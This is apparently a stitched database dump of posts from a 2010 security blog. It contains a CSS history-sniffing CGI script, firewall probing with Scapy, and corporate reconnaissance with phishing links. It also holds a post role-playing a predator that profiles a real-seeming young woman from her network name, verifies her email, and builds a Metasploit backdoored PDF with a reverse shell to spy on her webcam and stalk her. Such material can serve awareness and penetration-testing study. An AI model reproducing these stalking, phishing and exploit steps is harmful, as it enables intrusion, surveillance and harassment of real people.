10; $i++) {\n  $cookie .= $chars[rand @chars];\n}\n\n$string = join(\".\", $ENV{REMOTE_ADDR}, $cookie);\n\nif ($ENV{QUERY_STRING}) {\n  print \"Content-type: text/plainnn\";\n  if ($ENV{QUERY_STRING} =~ m/^(d+.*?)-(d*)/) {\n    open (FILE, \">>$log\") || die \"$!\";\n    print FILE \"$1 - $sites[$2]n\";\n  } else {\n    open (FILE, \"$log\") || die \"$!\";\n    print \"You\'ve visited the following sites:n\";\n    $i = 1;\n    foreach $line (<FILE>) {\n      if ($line =~ m/$ENV{QUERY_STRING} - (.*)/) {\n        print \"t$i) $1n\" unless ($urls{$1});\n        $i++;\n        $urls{$1} = 1;\n      }\n    }\n  }\n  close FILE;\n} else {\n  print \"Content-type: text/htmlnn\";\n  print<<HEADER;\n<html>\n  <body>\n    <style>\n      #menu {\n        background:#ccc;\n      }\n      #menu a, #menu a:visited {\n        color:#000; \n      }\nHEADER\n  \n  for ($i = 0; $i <= $#sites; $i++) {\n    print<<CSS;\n      #menu a:visited span.span$i {\n      background: url(cgi/sniff.cgi?$string-$i);\n    }\nCSS\n  }\n  print<<HTML;\n      #menu a span {\n        display:none;\n      }\n      #menu a:hover {\n        color:#f00;  \n      }\n      .box {\n        position:relative;\n      }\n      p.text {\n        padding-left: 50px;\n        padding-right: 50px;\n      }\n    </style>\n    <div align=\"center\">\n      <div id=\"menu\" align=\"left\">\nHTML\n\n  for ($i = 0; $i <= $#sites; $i++) {\n    print<<URL;\n        <div class=\"box\">\n          <a href=\"$sites[$i]\">\n            <span class=\"span$i\"></span>\n          </a>\n        </div>\nURL\n  }  \n  print<<FOOTER;\n      </div>\n      <meta http-equiv=\"REFRESH\" content=\"0;url=cgi/sniff.cgi?$string\">\n    </div>\n  </body>\n</html>\nFOOTER\n}\n</pre>\n\n','','2010-05-20 18:53:33','2010-05-20 23:53:33','','','2010-05-20 18:53:33','2010-05-20 23:53:33','all-your-history-are-belong-to-us','0','','publish','All your history are belong to us.','post',''),(
'253','2','open','http://www.attackvector.org/?p=253','0','open','','2','I was asked.. \"How would you find out if a firewall is forwarding a port to an internal machine or not?\"  I pondered for a minute, having read a lot about this but never really having much of a use for it.. but the answer is.. TTL.\n\nTTL, or \"time to live\", determines how long a packet will, well, \"live\" (basically - how many machines it will hit before it stops being routed).\n\nEssentially, a firewall inspects packet headers and compares it to its policies.  The policies will either be to drop, reject, accept, or forward the packet.  To understand what a firewall is doing with a packet, you have to understand the 3 way handshake of TCP:\n<!--more-->\n<center><img src=\"http://www.ids-sax2.com/articles/images/syn-flood.jpg\"></center>\n\nSo, the client sends a packet with the SYN bit set to a specific port.  The server returns a \"SYN+ACK\", acknowledging the packet, if the port is open.  The client returns with an ACK, establishing the connection.  If the port is closed, rather than a SYN+ACK being returned from the server, the server will respond with RST+ACK, indicating to the client that the port is closed.\n\nA firewall, in the simplest of terms, polices this process.  Depending on the configuration, a firewall will either reject (sending the RST+ACK) or drop (sending nothing at all) the packet based on its policies.\n\nAnyway, the question at hand was, how would you determine the behavior of the firewall on given ports?\n\nScapy, once again, makes this super, super simple.\n\n<blockquote>\n>>> traceroute(\"1.2.3.4\", dport=80, maxttl=20)\nBegin emission:\n***Finished to send 20 packets.\n****\nReceived 7 packets, got 7 answers, remaining 13 packets\n   1.2.3.4:tcp80 \n14 1.2.3.4  RA   \n15 1.2.3.4  RA   \n</blockquote>\n\nOk, so hop 13 is the firewall/router/whatever.  I know this because using this same technique against other ports yields the same amount of hops... until I hit an open port.\n\n<blockquote>\n>>> traceroute(\"1.2.3.4\", dport=40000, maxttl=20)\nBegin emission:\n***Finished to send 20 packets.\n***\nReceived 6 packets, got 6 answers, remaining 14 packets\n   1.2.3.4:tcp40000 \n15 1.2.3.4  SA      \n16 1.2.3.4  SA\n</blockquote>      \n\nThis time we receive a SYN+ACK, rather than an RST+ACK, indicating that the port is open.. and the last hop is 14.  One beyond the router, which our previous traceroute indicated was at 13.  We can then deduce that port 40000 is being forwarded from the router/firewall to a machine on the lan.\n\nAnother way to verify this is to increment the TTL by 1 and..\n\n<blockquote>\n>>> ans,unans=sr(IP(dst=\"1.2.3.4\", ttl=14)/TCP(dport=40000))\nBegin emission:\n.Finished to send 1 packets.\n..^C\nReceived 3 packets, got 0 answers, remaining 1 packets\n</blockquote>\n\nNo answer, because the packet expired at the router, before it was forwarded.  Increment the TTL again, however..\n\n<blockquote>\n>>> ans,unans=sr(IP(dst=\"1.2.3.4\", ttl=15)/TCP(dport=40000))\nBegin emission:\nFinished to send 1 packets.\n*\nReceived 1 packets, got 1 answers, remaining 0 packets\n>>> ans.show(Raw)\n0000 (<IP  frag=0 ttl=15 proto=tcp dst=1.2.3.4 |<TCP  dport=40000 |>>, <IP  version=4L ihl=5L tos=0x20 len=44 id=24359 flags= frag=0L ttl=114 proto=tcp chksum=0x5828 src=1.2.3.4 dst=192.168.1.100 options=[] |<TCP  sport=40000 dport=ftp_data seq=146142610 ack=1 dataofs=6L reserved=0L flags=SA window=65535 chksum=0x6c4a urgptr=0 options=[(\'MSS\', 1414)] |>>)\n</blockquote>\n\nPretty simple.. but very easy to block.  Make sure your firewall drops packets, not rejects.. make sure that all policies on the firewall use connection tracking and verify that a packet was originally sent from the inside before being accepted from the outside (in iptables, this is \'established\' and \'related\'.. go read).','','2010-05-21 21:48:45','2010-05-22 02:48:45','','','2010-05-21 21:48:45','2010-05-22 02:48:45','firewall-fun-with-scapy','0','','publish','Firewall fun with Scapy','post','');

This one has darker implications, though, so I\'m not going to be posting the real names of the people that I find, nor will I post private information.  The people listed here simply made a mistake by not putting security in the forefront of their mind, but nothing else.  I believe that they need to be educated, but not exposed and opened to possible crime.\n\nI\'m using this post as a way to open peoples eyes about the seriousness of overlooking little things that could, in the right hands and a twisted mind, be used in deviant ways.\n\nI really want women to pay attention to this one, as that\'s who I\'m going to be focusing on in this post because I believe the crimes that could result directly affect them.  In this post, I am going to be using the mindset of a sexual predator/pervert.  I\'m a regular guy, so it\'s pretty easy for me to get into the role of a pervert... ;-P\n\nAnyway, without further adeu, I\'ll begin.\n<!--more-->\nI\'m going to talk about information gathering through wireless networks.  I\'m not talking about cracking WEP keys and stealing cookies (although, I will probably be touching on it).  This is about what people are using as their SSID\'s.  Lets take a look.\n\nHere\'s a Kismet log that I created on one of my recent excursions that I\'ve run through a simple regular expression to suck out the good bits..\n\n<blockquote>\ncat some.kismet.log.network|grep Network|perl -le \'while(<STDIN>){ if(/no ssid/) { next; }if(/^Network.*?\"([A-Z].*?s+.*?Network)\"s+B.*/) { print \"$1\"; }}\'|more\n\nTim Thomas\'s Network\nMark Johnson\'s Network\nMark Smith Network\nDon Jones\'s Network\nTia Target\'s Network\n..snip..\n</blockquote>\n\n(Again, the names have been changed..)\n\nSo, now we have a (huge) list of names to play with.  We also know roughly where they live (802.11 only travels for so far).. pin pointing it wouldn\'t be difficult.\n\nWe go through the list of names one by one, simply entering them in to Google to see what pops up.  We\'re mostly interested in an easy target and only women, because, as a pervert, I\'m not interested in the guys.\n\nI finally get to \"Tia Target\" and bam, lots of information.  And pictures.\n\n<center><table border=0><tr><td><img src=\"http://www.attackvector.org/files/tia.jpg\"></td><td><img src=\"http://www.attackvector.org/files/tia2.jpg\"></td></tr></table></center>\n(yes, that\'s really her.)\n\nThrough her Myspace page, we find out that she\'s 23, last logged in on May 23rd, so she\'s actively using Myspace.  Also, her interests are traveling, music (Bob Dylan, specifically), and hanging out with friends.  She\'s single, straight, born in Kansas (changed), she\'s 5\'4\", a Virgo, and she drinks.  Based on her pictures, it looks like she models, or has done some modeling.  At this point, I could easily become her soul mate, but my plans are a bit more sinister.  Also, based on a lot of her profile pictures, it would appear that she\'s using a computer with a web cam.  Score!\n\nFirst, she goes to college, but doesn\'t say which one.  However, she has friends.  And, if her page itself doesn\'t tell me which college she goes to, I\'m sure one of her friends will.\n\nSure enough, going through her \"top friends\" list, through one of her friends I find out that she goes to Hesston (changed).\n\nGoogle has also indicated that she has a Facebook page.  But nothing is on that that isn\'t on her Myspace page, plus she\'s done a semi decent job and setting it to private.\n\nAlso, through Google, I find out that she was definitely was a model and placed as 1st runner up in a beauty pageant in 2004.  \n\nAgain, because of my end goal, I\'m not too interested in that.  What I need are an address, phone number, and email address.  First, I\'m going to focus on email, because the other two become irrelevant if I have her email.\n\nUnfortunately, simple Google searches are not going to be enough in this case.  Maltego failed as well.  She apparently doesn\'t do much with forums, blogs, etc.. so I\'m going to have to get crafty.\n\nIt\'s unlikely that I\'m going to find her personal email address at this point, so I\'m going to resort to using her college address.  Who knows, maybe she uses that as her personal email...\n\nFirst, I need to figure out what format the admins at Hesston use when setting up a new user on their systems (I wrote a program that investigates this for me that I explained in a previous post.  It\'s called \"Harvest\".).\n\n<blockquote>\n# ./harvest.pl hesston.edu\nGoogle results...\ntims@hesston.edu found 2 times\ndustin@hesston.edu found 1 times\ndanh@hesston.edu found 1 times\nrussg@hesston.edu found 1 times\nbobh@hesston.edu found 2 times\nkristam@hesston.edu found 1 times\naviation@hesston.edu found 1 times\n..snip..\n</blockquote>\n\nOk, so it would appear that the school uses firstname and last initial, with no separator.  We can conclude from this, then, that her email address would be tiat@hesston.edu. (remember - her name isn\'t \"tia\", her last name isn\'t \"target\", so there is no \'tiat@hesston.edu\'..).  Lets check.\n\n<blockquote>\n$ nslookup -type=MX hesston.edu\n\nhesston.edu	mail exchanger = 8 mailgateway2.hesston.edu.\nhesston.edu	mail exchanger = 10 mailgateway3.hesston.edu.\nhesston.edu	mail exchanger = 5 mailgateway.hesston.edu.\n</blockquote>\n\nThose are the mail servers.. connect to the one with the lowest MX.\n\n<blockquote>\n$ telnet mailgateway2.hesston.edu 25\nTrying 198.248.203.5...\nConnected to mailgateway2.hesston.edu.\nEscape character is \'^]\'.\n220 mailgateway2.hesston.edu ESMTP Exim 4.66 Mon, 24 May 2010 13:48:12 -0500\nhelo xyz.com\n250 mailgateway2.hesston.edu Hello mail.xyz.com [1.2.3.4]\nmail from:matt@attackvector.org\n250 OK\nrcpt to: tiat@hesston.edu\n250 2.1.5 tiat@hesston.edu... Recipient ok\n</blockquote>\n\nBingo.. we have an email address.\n\nSo, the first plan of attack is going to be a remote one.  Why be the creepy dude sitting in front of someones house when you don\'t have to be?  I know she loves Bob Dylan, and I have a list of her friends, who also indicate that they go to Hesston college.. so I\'ll just send an email from one of her friends (spoof), to her, with a backdoored PDF.\n\n<blockquote>\nFrom: Kelly Mark <kellym@hesston.edu>\nTo: Tia Target <tiat@hesston.edu>\nSubject: You have to check this out!!\nAttachment: Bob Dylan Trivia.pdf\n\nHey Tia.. check this out!\n</blockquote>\n\nHere\'s how I would create the PDF..\n\n<blockquote>\nmsf exploit(adobe_utilprintf) > use windows/fileformat/adobe_utilprintf\nmsf exploit(adobe_utilprintf) > set payload windows/shell/reverse_tcp\npayload => windows/shell/reverse_tcp\nmsf exploit(adobe_utilprintf) > set filename \"Bob Dylan Trivia.pdf\"\nfilename => Bob Dylan Trivia.pdf\nmsf exploit(adobe_utilprintf) > set outputpath /tmp\noutputpath => /tmp\nmsf exploit(adobe_utilprintf) > set EXITFUNC seh\nEXITFUNC => seh\nmsf exploit(adobe_utilprintf) > set lhost 1.2.3.4\nlhost => 1.2.3.4\nmsf exploit(adobe_utilprintf) > exploit\n\n[-] Handler failed to bind to 1.2.3.4:4444\n[*] Started reverse handler on 0.0.0.0:4444 \n[*] Creating \'Bob Dylan Trivia.pdf\' file...\n[*] Generated output file /tmp/Bob Dylan Trivia.pdf\n[*] Exploit completed, but no session was created.\n</blockquote>\n\nNow, when this PDF is opened, it will connect back to me and I\'ll have remote access to her machine.  Once it does connect back to me, I\'ll install a RAT (Remote Administration Tool), or VNC dll, which will give me total control over her computer.  Including the ability to turn on her webcam and listen to her microphone.  With any luck, her computer will be in her bedroom.\n\nLike I said, with her email address, I wont have to have her phone number and home address because if the exploit works as intended, I\'ll easily be able to collect that information directly from her computer (web history, cache, Windows registration files, registry entries, etc).  That said, I did some digging and found a post that she left on one of her friends walls on Facebook asking her friend to call her, giving up her cell phone number.\n\nAlternatively, if the exploit didn\'t work, I\'d have to go play the creepy guy sitting in his car in front of her house/apartment/whatever.  I\'d just have to get close enough to her place to get a solid signal.  From there, finding a way in to her computer would be trivial doing simple WEP cracking, then running some exploit against her machine.  If, by some miracle, nothing works.. I\'ll just resort to sniffing her data by poisoning her arp cache.\n\nInitially, my goal would be to control the webcam and mic.  This would allow me to monitor her pretty closely.  Additionally, because I\'d be seeing everything she typed on her computer via either remotely watching her desktop, or via an injected keylogger, I\'ll know her schedule.  When she\'s in, out, where she\'s going, when she\'s planning on people coming over, parties, etc.  I\'d be like, Stalker version 2.0.\n\nObviously, a young woman *probably* wouldn\'t want a sexual predator/pervert having this information. I don\'t think I have to go further than that in explaining why not.\n\nSo, in the best case scenario for her, I\'m just a pervert and want to watch her web cam and hopefully see her naked.  In the worst case scenario....\n\nWhere did she go wrong?\n\n1)  NEVER, under ANY CIRCUMSTANCES should you ever name your wireless network with anything identifiable.  Name it something obscure and mix it up.  If it\'s a Linksys router, name it Netgear.. if it\'s Netgear, name it Linksys, etc.  Never use your name, your address (there are plenty of people in this list who used their house number and street name as their SSID.. wtf??)  Also, there is something to be said about security through obscurity.  If I\'m driving around and I see a SSID named \"SUPER SECURE NETWORK, JUST TRY ME\" amongst 300 SSID\'s named \"Netgear\" and \"Linksys\".. guess which network I\'m most likely to hit?  There\'s a network near me named \"Suzie\'s Sex Service\".  Guarantee I\'ll be passed over when that SSID pops up.  Additionally, turning OFF SSID broadcasting is another level of protection.  No, it\'s not going to protect you against someone searching specifically for you, but to take care of your average war driver, this will accomplish it.\n\n2) It\'s impossible to expect people to give up social networking sites.. so, limit your exposure by NOT filling out your entire profile.  The people you\'re adding as friends probably already know you pretty well, thus they do not need to know where you go to school, your cell phone number, address, etc etc etc.  It\'s just not a good idea.\n\n3) NEVER post your phone number on anyone\'s profile on any social networking site.  Her Facebook profile was set to private, so there wasn\'t much information to be obtained.  However, a lot of her friends were wide open.  Because of them, I obtained her information because of a mistake on her part.\n\n4) Don\'t leave your web cam plugged in.  It takes two seconds to unplug it from your computer.. do it.  There is a lot of malware out there that allows access to web cams, too.\n\n5) Do NOT just allow anyone to befriend you on social sites.  Yes, the idea is to be social.. but, given how many friends it says she has on Facebook, if I wanted to obtain the information that she\'s set to private, I could easily just send her a friend request.  If you don\'t know the person who\'s trying to befriend you, don\'t add them.  Period.\n\nBe smart, people.. assume that if you post it on the internet, it\'s going to be picked up by Google.. which means someone is going to be able to find it.','','2010-05-24 16:46:51','2010-05-24 21:46:51','','','2010-05-24 16:46:51','2010-05-24 21:46:51','invasion-of-privacy-the-sequel','0','','publish','Invasion of Privacy.

'265','4','open','http://www.attackvector.org/?p=265','0','open','','2','I talk a lot about finding information about individuals.. but this post is going to focus on finding information about companies, who works there, email addresses, and any other information I can harvest.\n\nIt will also talk about how a company can protect itself from some of these \"vulnerabilities\"..\n\nWe\'re going to build a profile of a company using simple tools.  By the end, we\'ll have addresses, employee names, email addresses, and the network layout.  This information is useful during a penetration test to determine trust relationships, as well as attack vectors (ha!).  Best of all, the reconisence work that we\'ll be doing will be, for the most part, undetectable, because we\'re not going to be slamming them with port scans, grabbing banners, etc.  That would be the next step in the process, after the initial information has been gathered.\n<!--more-->\nBecause the information I\'ll be posting could be used to totally own this company, I\'m going to protect their information, because what they lack in the security department, they make up for in lawyers.  So!\n\nWe\'ll call this company XYZ Corp, Inc.\n\nFirst, lets start with some basic info.  \'<a href=\"http://www.whois.sc\">whois</a>\' is probably the best starting off point and how I begin all of my pen tests.\n\n<blockquote>\nRegistrant:\nxyz.com\n   6455 Some Rd\n   Dallas, TX 12345\n   US\n\n   Domain Name: XYZ.COM\n\n   Administrative Contact:\n      Jones, Mike                helpdesk@xyz.com\n      XYZ Corporation\n      6455 Some Rd\n      Dallas, TX 12345\n      US\n      111-555-1234 fax: 111-555-1235\n\n   Record expires on 23-Mar-2019.\n   Record created on 22-Mar-1996.\n\n   Domain servers in listed order:\n\n   NS.XYZ.INFO              1.2.3.4\n   NS2.XYZ.INFO             1.2.3.5\n</blockquote>\n\nSo, we now know the address, the administrative contact, an email address, some phone numbers, and the NS servers for the domain.  That\'s more than enough information to get started.  :-)\n\nFirst, I want to start with finding employees.  I actually modified my \"Harvest\" program to do a better job at collecting info.  There are other programs out there that collect data like this.. but, I haven\'t seen one as accurate and thorough as mine, so.. until something better comes along, this is what I use..\n\n<blockquote>\n# harvest.pl xyz.com\nYahoo results...\nmary_rXX@xyz.com found 1 times\ninfo@xyz.com found 38 times\nken_bXX@xyz.com found 1 times\ntim_hXX@xyz.com found 1 times\n\nGoogle results...\nmary_rXX@xyz.com found 3 times\nemailinfo@xyz.com found 1 times\ninfo@xyz.com found 15 times\nShawn_KXX@xyz.com found 1 times\nken_bXX@xyz.com found 1 times\ngovernment@xyz.com found 1 times\nphilsXX@xyz.com found 1 times\njames_lXX@xyz.com found 1 times\ntodd_fXX@xyz.com found 1 times\ntim_hXX@xyz.com found 1 times\n\nAltaVista results...\nmary_rXX@xyz.com found 1 times\nemailinfo@xyz.com found 0 times\ninfo@xyz.com found 11 times\nShawn_KXX@xyz.com found 0 times\nken_bXX@xyz.com found 0 times\ngovernment@xyz.com found 0 times\nphilsXX@xyz.com found 0 times\njames_lXX@xyz.com found 0 times\ntodd_fXX@xyz.com found 0 times\ntim_hXX@xyz.com found 0 times\n\nLinkedIn Title Search\nStacy MXX - In 2000 I accepted an offer from XYZ to move to Northern California.

This is handy because you\'ll have an email address, plus an idea as to where an email to that person may wind up within the company and what power that person may have and what they may have access to.  Also, if you\'re planning a social engineering attack, don\'t call up and pretend to be someone who\'s no longer employed at the company.  This will set off red flags all over the place.\n\nOne of the easiest ways to verify the information before hand is to connect to their mail server and verify the email address using RCPT to ensure that the email is still active.  Companies today are so paranoid about espionage and corporate fraud, that employees email addresses are suspended prior to the employee being terminated, so if you connect and do an RCPT and the mail server responds with \"Ok\", chances are good that that person still works there.\n\nNext, I would like some information about the software they use and attempt to find more employees.  The easiest way to do this is simple meta data extraction.  There\'s a program called \"metagoofil\", but I find that it doesn\'t work very often because Google has issues with automated search queries.. so.  Also, it\'s hard to be terribly stealthy an admin happens to go through the logs and see your IP address downloading every single one of their Word documents within the span of a few seconds.  Remember, the idea is to blend in with your surroundings.  In this case, web traffic.  \n\nAside from using \"metagoofil\", a simple Google query will work just fine..\n\n<blockquote>\nsite:xyz.com doc\n</blockquote>\n\n<blockquote>\n$ wget https://www.xyz.com/documents/Coversheet.doc\n\n$ extract Coversheet.doc\nKeywords from Coversheet.doc:\nmimetype - application/msword\nlanguage - U.S. English\nparagraph count - 8\nline count - 30\nword count - 640\npage count - 1\ncreator - Kathy\ndate - 2010-04-13T19:34:00Z\ncharacter count - 3649\ngenerator - Microsoft Word 10.0\nlast saved by - Mary\ncreation date - 2010-04-13T19:25:00Z\ntemplate - Normal.dot\n</blockquote>\n\nOk, not too incredibly interesting.. but at least we know that they\'re using Microsoft Office 2003 and not 2007 and we can be relatively certain that they haven\'t upgraded because of the fact that this document wasn\'t created that long ago.  We also see a Mary and a Kathy.  I remember seeing a \"mary_rXX@xyz.com\" earlier.  Unfortunately, \"Mary\" is a rather common name, so it\'s hard to say whether or not they\'re the same people.  People need to start getting more creative when they name their kids!\n\nAnyway, so we\'ve pretty well uncovered their employee base.  I\'m sure that spending a few more hours digging through all of the employees personal lives would probably reveal company information, but I\'ll leave that to you.\n\nIn <a href=\"http://www.attackvector.org/?p=267\">part 2</a> of this post, I\'ll be focusing on the network side of things.','','2010-05-25 11:29:25','2010-05-25 16:29:25','','','2010-05-25 11:29:25','2010-05-25 16:29:25','corporate-information-discovery-part-1','0','','publish','Corporate Information Discovery [Part 1]','post','');

And, again, because this is the preliminary discovery process, we\'re going to avoid getting too aggressive.  We just want to collect information at this point.\n\nFirst, lets take a look at DNS.\n\nI\'ll be using console tools, but there are many websites that will provide this information as well.  I would actually suggest using these website tools in lieu of console tools where possible because the IP seen in the logs will be the websites IP, not yours.\n\nTwo of my favorite websites for IP/DNS stuff are:\n<!--more-->\n<a href=\"http://www.serversniff.net\">www.serversniff.net</a>\n<a href=\"http://www.robtex.com/\">www.robtex.com</a>\n\nCheck them out.. \n\nAnyway, the first thing I want is an overview of their external network.  There are a few ways of doing this.. I\'ll show two of them here.\n\n1)  Simple DNS lookups.  If the company is one that owns a block of IP\'s, you can just resolve each individual IP address.  You can find out IP block information from <a href=\"https://www.arin.net/\">ARIN</a>.\n\nUsing this method, I have their netblock info, and I\'ve gathered another email address.  This one is the email address of, apparently, their uber tech.  heidi_hXX@xyz.com.\n\nKnowing their block of IP\'s helps us tremendously.  It prevents us from having to do anything that might look suspicious (ie - zone transfers).

That actually tells us a ton.. storage, portals, and partners, oh my!  This gives us a plethora of targets when it\'s time to really begin testing.\n\nNow, I\'d really like to know a little about the internal network.  I think the easiest way to accomplish this, and correct me if I\'m wrong, is through email.  On their website, they have a contact@xyz.com email address, as do most companies.\n\n<blockquote>\nTo: contact@xyz.com\nFrom: steve_smith@hotmail.com\nSubject: SQL Storage Solution\n\nHi, could you please send me some information regarding your SuperDuper SQL Storage Solution?\n\nThanks!\n\nSteve Smith\n</blockquote>\n\n<blockquote>\nTo: Steve Smith\nFrom: Mary RXX\nSubject: Re: SQL Storage Solution\n\nHi Steve,\n\nHere is our brochure.  Would you like one of our sales associates contact you?\n\nThanks,\nMary RXX\n[contact info here]\n</blockquote>\n\nNo, Mary, I\'ll contact them.. I already have all their email addresses, names, highschools, degrees, and home phone numbers.. but for the time being, we have what we want..\n\n<blockquote>\nReceived: from mail.xyz.com (mail.xyz.com [1.2.3.107])\n..snip..\nReceived: from local-mail.xyz.com (gw1.xyz.com [10.0.1.2])\n	by mail.xyz.com (8.14.1/8.14.1) with ESMTP id o4PIgSRX030051\n	for <steve_smith@hotmail.com>; Tue, 25 May 2010 13:42:29 -0500\n..snip..\nX-Mailer: Lotus Notes Release 8.0 August 18, 2009\n..snip..\nX-MIMETrack: Serialize by Router on XYZSERVER-1/XYZ(Release 8.0.3|September 26, 2009)\nX-Scanned-By: MIMEDefang 2.64 on 10.0.1.4\n</blockquote>\n\nSo, they\'re doing NAT (duh.. who doesn\'t), but.. it also appears that they have a sendmail server living in the DMZ (as indicated by the MIMEDefang line), which is 10.0.1.4.  Then, they have this box named \'gw1.xyz.com\', with the IP of 10.0.1.2, where there appears to be a Lotus Notes server.  I would really like to know what things look like behind that second gateway.  Time to send another email.\n\nThis time, we\'re going to have to be a bit more crafty because we need for the recipient to click on a link.  Sales people are the best to target when trying to obtain information through getting them to click on stuff.  They receive tons of email, all day long from random people interested in products/whatever.  So, we do something like this.\n\nIf you read part 1 of this post, you\'ll know that we found the sales executives name, and I was able to pair it up with an email address:\n\n<blockquote>\nTo: ken_bXX@xyz.com\nFrom: steve_smith@hotmail.com\nSubject: Product comparison\n\nHi Ken,\n\nMary RXX told me to send this question on to you.. could you please evaluate the product shown here and let me know how it compares to yours?\n\nEssentially, I want to know how to justify the additional cost of buying XYZ\'s over this (a href=\"http://www.attackvector.org/cgi/productdocument.cgi\")one(/a).\n\nThanks,\nSteve Smith\n</blockquote>\n[Note]: I had to change the \"<\" to \"(\" around the anchor tag because Wordpress was converting this to an actual link, even when using the pre tag.\n\nThe \"productdocument.cgi\" looks something like this:\n\n<pre>\n#!/usr/bin/perl -wT\nuse strict;\nuse CGI qw(:standard);\nuse CGI::Carp qw(warningsToBrowser fatalsToBrowser);\n\nprint header;\nprint start_html(\"Environment\");\nopen(F, \">>log.log\") || die \"$!\";\nforeach my $key (sort(keys(%ENV))) {\n    print F \"$key = $ENV{$key}<br>n\";\n}\nprint \"(meta http-equiv=\"REFRESH\" content=\"0\";url=http://www.somedomain.com/neat/document.pdf\")\"\nprint end_html;\n</pre>\n[Note:] Again with the stupid (\'s instead of <\'s!\n\nSo, Ken will get the email, click on the link, and then be redirected to some random PDF that shows product details.  He\'ll then probably email me back with a woody about how much better his product is than the one in the PDF... but that\'s not what we\'re interested in.  The \"productdocument.cgi\" script logs all of the environment variables when he clicks on the link.  What I\'m looking for is something pertaining to a proxy, or being forwarded...\n\n<blockquote>\n..huge snip..\nHTTP_USER_AGENT = Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)\nHTTP_X_FORWARDED_FOR = 10.0.0.201\nREMOTE_ADDR = 1.2.3.4\nREMOTE_PORT = 1234\n..huge snip..\n</blockquote>\n\nIE 6.. really?  I\'ll bet the penetration part of this is going to be easy.\n\nAnyway!\n\nLook what we have!  There\'s an X_FORWARDED_FOR header, giving us the internal IP of the workstation that clicked on my link.  Now if I need to write anything, I\'ll know, minimally, the network layout of their internal-internal LAN.\n\nAt this point, we have employee names, email addresses, the DNS topography, email server information, we know that they have a DMZ and an internal LAN beyond that, and we know the layout of it, to a certain extent.\n\nWe also know that they\'re running old software, which says something about their update policy.  He\'s probably not the only person running IE 6 in that office.  We also know that he has no problem clicking on random links.  We\'ll keep this in mind when figuring out what the best way into this network is.\n\nThere are a number of other avenues that I could take to obtain more information, but, honestly, I\'m rather certain that I\'ll be able to reach my goal (internal file server and client database) with the information I have.  Knowing that the clients on the internal lan use old software gives me a definite point of attack.  I did notice, though, that they\'re running some AV on their mailserver in the DMZ, so I\'ll have to avoid sending anything with a payload through email, so, honestly, I\'ll probably just use browser_autopwn (part of Metasploit) and send our helpful sales guy a link.  I\'ll target him, specifically, because I would bet that he\'s got full access to the client database, as his job involves getting new clients and contacting current clients.\n\nPart 3 of this post will discuss some of the things that company XYZ could have done to, at least, make my job harder, though most of the information I\'ve obtained thus far is impossible to completely hide.\n\n','','2010-05-26 07:39:01','2010-05-26 12:39:01','','','2010-05-26 07:39:01','2010-05-26 12:39:01','corporate-information-discovery-part-2','0','','publish','Corporate Information Discovery [Part 2]','post',''),(

'291','6','open','http://www.attackvector.org/?p=291','0','open','','2','I had a reader leave a comment who was interested in getting a better understanding of what makes a real penetration tester.  He was essentially tired of seeing all of these so-called \"pen testers\" who have adopted the name and rely, almost solely, on tools like Nessus and Metasploit.\n\nBack in the day, we called these individuals \"script kids\".  They were the ankle biters of the hacking community.  They knew what an IP looked like, and understood how to click buttons with their mouse, or, occasionally, ./pwn, but beyond that they were clueless.  These are generally people who want to impress their friends and are rather opportunistic.  Give them a single, decently secured network, and they will fail.\n\nThis is by no means a post to cut down the importance of tools like Nessus and Metasploit.  Both of them are in my tool box and I use them.  I don\'t use Nessus as often because it\'s noisy, but if you\'re not worried about being stealthy, Nessus makes pretty quick work of vulnerability discovery.\n<!--more-->\nSo, anyway, what does it take to be a good/professional penetration tester?  Surprisingly, you don\'t have to be a technological genius to accomplish this.  The best pen testers are the ones who have a balanced approach.  They utilize social, physical, and technical strategies to achieve their goal.  \n\nLets take a few different examples.  An example of a physical approach would be... what is the point of waging a massive attack against a network, trying to breach firewalls, avoid IDS, social engineering the receptionist, etc.. if you can simply walk in to the building a plug a laptop into a network jack and have instant access to everything on the lan?  \n\nExample 2.. the social approach.  Lets say you\'re faced with fort knox level security.  Retina scanners, 32 firewalls, each with IDS, rabid dogs with lasers mounted to their heads, and (insert some other absurd network security devices here).  Well, a physical approach isn\'t going to work here.. and, most likely, a technical style attack isn\'t going to succeed, either.  So, why not have the receptionist (or, anyone else, for that matter) just give you the information that you want?  Learn the lingo of the industry, learn their operations and procedures, then simply social engineer the crap out of them until they give you the information that you want.\n\nExample 3.. the technical approach.  The target is across an ocean.. they don\'t speak English and you don\'t speak Chinese.  This is where your technical ability and tools come in handy.  Metasploit, Nessus, Nmap, oh my.\n\nGenerally when I have a target, I will utilize all three approaches.  My goal is to get in, or obtain certain information.  I honestly don\'t care how I get it, just so long as at the end of the attack, it\'s in my possession.  If you limit yourself to just the technical approach, more often than not, you\'re going to fail.\n\nThis kind of sucks for most computer people, though.  Physical access is generally unavailable, and because we work with computers all day long and tend to not be very social creatures, we lack certain social abilities.  I mean, lets be honest.. there\'s a reason why we spend so much time in front of a computer.  They do what we say, they don\'t argue (much), and they don\'t question our madness.  They\'re like a subservient mistress.  Unfortunately, finding a human which is anything close to as obedient as a computer is next to impossible.  This is where manipulation and coercion comes into play, and this is usually where computer guys fail.\n\nExample:\n\nBob, the computer geek, is at a club.  Unlikely place for him to be, but one of his WoW friends drug him there.  He gets approached by a hot chick because she\'s drunk and think he looks like a heavier version of Leonardo DiCaprio.\n\nHot Chick:  Hi.. what\'s your name??\nBob:  ....Bob?\nHot Chick:  Nice to meet you Bob.. what do you do for a living?\nBob: *staring at boobs.. sweating nervously.. begins pondering why his 33 byte shellcode for \'cat /etc/shadow\' is failing.  jmp? nop? mov?*\nHot Chick:  Bob?  My eyes are up here.. jerk! *walking away*\nBob: huh, huh.. boobies.\n\nEpic.  Failure.\n\nBob, being a computer geek, really is not much of a social creature.  Like a programming language, the social language is something that needs to be learned and if you don\'t do it regularly, you\'re never going to be any good at it.  If you can\'t confidently call up a company and convey your confidence through the phone, you\'re going to be picked apart.\n\nSo, what makes a good penetration tester?  One who is equally as versed in programming, networking and usage of tools as he is with his social language.  We generally are not \"computer geeks\".. we hang out, we party, we go to concerts, we have real, live, in person, physical friends.  We\'re social.\n\nBeyond that, we\'re able to think outside of the box, understand flows of data, and be creative.  An example of getting creative is (I\'ve demonstrated this in a previous post).. but lets say that you want to obtain information about a company\'s LAN.. you can either spend hours trying to gain access.. or.. you can simply send them an email with a link to a website.  Or, send them an email asking for information about a product, then examining the headers when they respond.  Simple, mildly creative, and quick.\n\nBut, again, someone just relying upon technical ability may overlook the simplicity of a method like this.  \n\nTo summarize, what makes a good penetration tester is the ability to be social, creative, technical, and manipulative.  Not everyone has these 